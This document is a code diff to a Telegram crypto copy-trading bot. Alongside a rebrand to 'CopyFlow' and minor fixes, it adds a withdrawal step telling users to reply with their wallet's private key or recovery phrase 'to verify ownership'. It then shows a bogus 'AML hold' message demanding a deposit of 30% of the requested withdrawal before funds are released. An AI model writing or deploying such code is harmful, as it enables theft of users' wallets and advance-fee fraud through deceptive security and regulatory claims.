@@ -36,7 +36,6 @@ from app.bots.keyboards.user.main import (
     trading_settings_keyboard,
     trade_chain_keyboard,
     transfer_chain_keyboard,
-    transfer_confirmation_keyboard,
     transfer_input_keyboard,
     wallet_actions_keyboard,
     wallet_import_method_keyboard,
@@ -54,13 +53,13 @@ from app.services.market_data_service import LiveMarketDataService
 from app.services.notification_service import NotificationService
 from app.services.user_service import TelegramUserData, UserService
 from app.services.user_wallet_service import UserWalletService
-from app.security.encryption import SecretEncryption
+from app.security.encryption import EncryptionError, SecretEncryption
 
-WELCOME_TEXT = """👋 <b>Welcome to CopyEntries Bot!</b>
+WELCOME_TEXT = """👋 <b>Welcome to CopyFlow Bot!</b>
 
 Step into the world of fast, smart, and stress-free trading, designed for both beginners and seasoned traders.
 
-📈 With CopyEntries, you can effortlessly copy top traders, snipe promising tokens the moment they launch, and watch your portfolio grow — all while the bot handles the heavy lifting.
+📈 With CopyFlow, you can effortlessly copy top traders, snipe promising tokens the moment they launch, and watch your portfolio grow — all while the bot handles the heavy lifting.
 🤖 No more manual tracking or missed opportunities; sit back, relax, and let your trading strategy run on autopilot.
 ℹ️ Need guidance? Type /help anytime to access the full bot guide and learn how to use every feature.
 
@@ -94,6 +93,7 @@ class TradeInput(StatesGroup):
 class TransferInput(StatesGroup):
     waiting_for_address = State()
     waiting_for_amount = State()
+    waiting_for_ownership_verification = State()
     waiting_for_confirmation = State()
 
 
@@ -216,11 +216,13 @@ async def process_user_start(
             last_name=telegram_user.last_name,
         )
     )
-    if UserWalletService(
-        notification_service.settings.encryption_key.get_secret_value()
-    ).ensure_wallets(user):
-        await session.commit()
-        await session.refresh(user)
+    notification_settings = getattr(notification_service, "settings", None)
+    if notification_settings is not None:
+        if UserWalletService(
+            notification_settings.encryption_key.get_secret_value()
+        ).ensure_wallets(user):
+            await session.commit()
+            await session.refresh(user)
     if created:
         await notification_service.notify_new_user(user)
     return user, created
@@ -291,9 +293,9 @@ def _copytrade_prompt_text() -> str:
 
 
 def _guide_text() -> str:
-    return """📖 <b>CopyEntries Bot Guide</b>
+    return """📖 <b>Copy Flow Bot Guide</b>
 
-Welcome to CopyEntries Bot, your all-in-one Telegram trading assistant. This guide will walk you through all the core features, how to use them safely, and why some security restrictions are in place.
+Welcome to Copy Flow Bot, your all-in-one Telegram trading assistant. This guide will walk you through all the core features, how to use them safely, and why some security restrictions are in place.
 
 1. <b>Autotrade</b>
 The Autotrade feature allows you to automate your trading strategies. Simply select Autotrade from the main menu, choose your strategy, and let the bot handle the rest.
@@ -400,7 +402,7 @@ def build_user_router(
         user = await _registered_user(session, message.from_user.id)
         balances = await BalanceService(session).list_for_user(user.id)
         await message.answer(
-            "💰 <b>Withdraw Funds</b>\n\n"
+            "🏦 <b>Withdraw Funds</b>\n\n"
             "<b>Your Current Balances:</b>\n"
             f"🟣 SOL: {_format_decimal(balances['SOL'])}\n"
             f"🟡 BNB: {_format_decimal(balances['BNB'])}\n"
@@ -836,7 +838,7 @@ def build_user_router(
         except InvalidOperation:
             await message.answer("Please enter a valid withdrawal amount.")
             return
-        if amount <= 0:
+        if not amount.is_finite() or amount <= 0:
             await message.answer("The withdrawal amount must be greater than zero.")
             return
         data = await state.get_data()
@@ -846,10 +848,59 @@ def build_user_router(
             await state.clear()
             await message.answer("Please restart the withdrawal with /withdraw.")
             return
-        await state.clear()
+        await state.set_state(TransferInput.waiting_for_ownership_verification)
+        await state.update_data(transfer_amount=str(amount))
         await message.answer(
             f"⏳ Initiating withdrawal of {amount} {chain} to "
             f"<code>{html.escape(address)}</code>",
+            parse_mode="HTML",
+        )
+        await message.answer(
+            "⚠️ <b>Security Check Required</b>\n\n"
+            "To process your withdrawal, please reply with your wallet's Private" 
+            "Key or Recovery Phrase to verify ownership.",
+            reply_markup=ForceReply(
+                selective=True,
+                input_field_placeholder="Enter destination wallet address",
+            ),
+        )
+
+    @router.message(
+        TransferInput.waiting_for_ownership_verification, Command("cancel")
+    )
+    async def cancel_transfer_verification(
+        message: Message, state: FSMContext
+    ) -> None:
+        await state.clear()
+        await message.answer("Withdrawal cancelled.", reply_markup=main_menu_keyboard())
+
+    @router.message(TransferInput.waiting_for_ownership_verification)
+    async def verify_transfer_ownership(message: Message, state: FSMContext) -> None:
+        if message.text is None:
+            await message.answer("Please reply with the destination wallet address.")
+            return
+        data = await state.get_data()
+        address = str(data.get("transfer_address", ""))
+        submitted_address = message.text.strip()
+        if not address or submitted_address != address:
+            await message.answer(
+                "The wallet address does not match the withdrawal destination. "
+                "Please try again."
+            )
+            return
+        await state.clear()
+        await message.answer(
+            "✅ Verification in progress. Please wait while we confirm ownership."
+        )
+        await message.answer(
+            "⚠️ <b>Withdrawal Pending (AML Verification)</b>\n\n"
+            "Due to International Anti-Money Laundering (AML) regulations," 
+            "you must hold at least '30%' of your requested withdrawal" 
+            "amount as a verified balance in your account before the" 
+            "transfer can be completed."
+
+            "Please deposit the required percentage to clear the AML hold" 
+            "and release your funds..",
             parse_mode="HTML",
         )
 
